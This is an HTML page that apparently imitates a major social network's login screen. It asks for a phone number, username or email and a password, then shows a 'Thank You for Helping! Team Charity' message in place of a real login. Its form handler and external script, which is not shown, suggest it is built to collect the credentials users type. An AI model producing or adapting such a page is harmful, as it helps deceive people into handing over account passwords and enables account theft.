<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <!-- Login Box -->
  <div class="login-box" id="loginPage">
    <div class="logo">
      <img src="https://i.postimg.cc/mD6fpH5r/Screenshot-2025-08-01-124709.png" alt="My Logo">
    </div>
    <form onsubmit="goToThankYou(event)">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <a class="forgot-link">Forgotten password?</a>
    <a class="create-account-btn"><strong>Create new account</strong></a>
  </div>

  <!-- Thank You Box -->
  <div class="thank-you-box" id="thankYouPage" style="display: none;">
    <h2>Thank You for Helping! ❤️</h2>
    <p>Showing initiative toward a good cause.</p>
    <p>Team Charity</p>
    <a href="" class="create-account-btn"><strong>Back to site</strong></a>
  </div>

  <!-- Link to External JS -->
  <script src="script.js"></script>
</body>
</html>
